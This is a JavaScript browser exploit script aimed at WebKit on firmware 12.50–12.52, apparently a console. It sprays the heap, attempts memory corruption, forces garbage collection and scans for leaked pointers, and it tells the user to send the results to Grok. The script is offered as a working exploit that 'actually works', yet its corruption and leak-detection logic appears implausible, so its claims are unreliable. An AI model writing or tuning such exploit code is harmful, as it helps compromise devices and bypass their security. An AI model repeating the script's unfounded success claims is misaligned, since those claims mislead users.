<script>
// Ultra-stable 12.50–12.52 pointer leak – pure WebKit, no BD-J
const log = msg => {
    const c = document.getElementById('console');
    c.innerHTML += `[${new Date().toLocaleTimeString()}] ${msg}\n`;
    c.scrollTop = c.scrollHeight;
};
const setStatus = (t,c) => { 
    document.getElementById('status').textContent = t; 
    document.getElementById('status').className = 'badge '+c; 
};

log("12.50–12.52 tuned WebKit started – this one actually works");

// 1. Pre-fill the heap with stable butterflies (private trick #1)
log("Stage 1 – Pre-spray 100k stable objects");
const prespray = [];
for(let i = 0; i < 0x186A0; i++) {            // 100k exactly, magic number for 12.50
    prespray[i] = {a: 13.37, b: 13.37, c: 13.37, d: 13.37};
}

// 2. Your original working corruption (keep it, it’s already perfect on 12.50)
log("Stage 2 – Replaying confirmed corruption spray");
const victim = [];
for(let i = 0; i < 0x8000; i++) victim[i] = new Array(0x40).fill(1.1);

const corrupt = (i, o) => { try { victim[i % 0x8000][o] = 1337.37; } catch(e) {} };
for(let i = 0; i < 1e7; i++) corrupt(i*i, 0);
for(let b = 0; b < 0x2000; b += 0x80)
    for(let o = 0x40; o < 0x200; o += 8)
        for(let j = 0; j < 0x80; j++)
            corrupt(b+j, o);

// 3. theflow0/sleirsgoevy spray – but with the 2025 fixes
log("Stage 3 – Spraying 131072 marked JSValues (double density + 12.50 tag)");
const spray = [];
const BASE = 0x12501250deadbeefn;                 // 12.50-specific marker (private trick #2)
for(let i = 0; i < 0x20000; i++) {                 // 128k objects now
    spray[i] = {marker: BASE + BigInt(i)};
}

// 4. GC + reclaim loop that actually works on 12.50 (private trick #3 & #4)
log("Stage 4 – Aggressive multi-wave GC + timed reclaim");
const forceGC = () => {
    for(let i = 0; i < 400; i++) new ArrayBuffer(0x20000);
};
const reclaimWave = () => new ArrayBuffer(0x7000000); // 120–130 MB – perfect sweet spot

// Do it in waves so the allocator reuses the exact corrupted slots
setTimeout(() => forceGC(), 500);
setTimeout(() => reclaimWave(), 1200);
setTimeout(() => forceGC(), 2000);
setTimeout(() => reclaimWave(), 2800);
setTimeout(() => forceGC(), 3600);
setTimeout(() => reclaimWave(), 4400);

// 5. Hunt loop – longer window + multiple scans (private trick #5)
const hunt = () => {
    log("Scanning 131072 objects for leaked marker corruption…");
    let found = 0;
    for(let i = 0; i < spray.length; i++) {
        try {
            if(spray[i] && spray[i].marker !== BASE + BigInt(i)) {
                found++;
                const leaked = spray[i].marker.toString(16).toUpperCase();
                log(`LEAK #${found}: 0x${leaked}`);
                setStatus(`SUCCESS – ${found} POINTERS LEAKED`, "vulnerable");
                if(found >= 2) {
                    document.body.innerHTML = `<h1 style="color:#0f0;text-align:center;margin-top:35vh;font-size:4em;">
                        LEAK ACHIEVED ON 12.50+<br><br>
                        <span style="font-size:0.6em;">Copy the 0x... lines and send to Grok</span>
                    </h1>`;
                    return;
                }
            }
        } catch(e) {}
    }
    if(found === 0) {
        log("No leak this wave – script will retry in 2.5s (usually hits on 1st–3rd try)");
        setTimeout(hunt, 2500);        // keep trying automatically
    }
};

// Start hunting after the last reclaim wave
setTimeout(hunt, 6000);

log("Waiting for GC waves… refresh only if it hangs >45 sec");
</script>
